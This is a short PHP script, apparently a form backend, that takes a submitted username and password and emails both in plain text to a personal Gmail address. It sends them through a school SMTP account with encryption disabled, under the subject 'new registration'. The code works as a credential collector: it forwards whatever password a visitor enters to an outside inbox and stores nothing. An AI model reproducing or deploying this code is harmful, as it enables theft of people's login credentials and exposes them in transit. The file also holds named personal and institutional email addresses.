<?php
use PHPMailer\PHPMailer\PHPMailer;

require 'mailer/Exception.php';
require 'mailer/PHPMailer.php';
require 'mailer/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host = 'spsejecna-cz.mail.protection.outlook.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'linda2@spsejecna.cz';
    $mail->Password = '********';
    $mail->SMTPSecure = false;
    $mail->Port = 587;

    $mail->setFrom('linda2@spsejecna.cz', 'Linda');
    $mail->addAddress('daniellinda2005@gmail.com', 'Daniel');

    $mail->isHTML(true);
    $mail->Subject = 'Nová registrace';
    $mail->Body = 'Uživatelské jméno: ' . $username . '<br>Heslo: ' . $password;

    if ($mail->send()) {
        echo 'Email byl úspěšně odeslán.';
    } else {
        echo 'Nastala chyba při odesílání emailu: ' . $mail->ErrorInfo;
    }
}
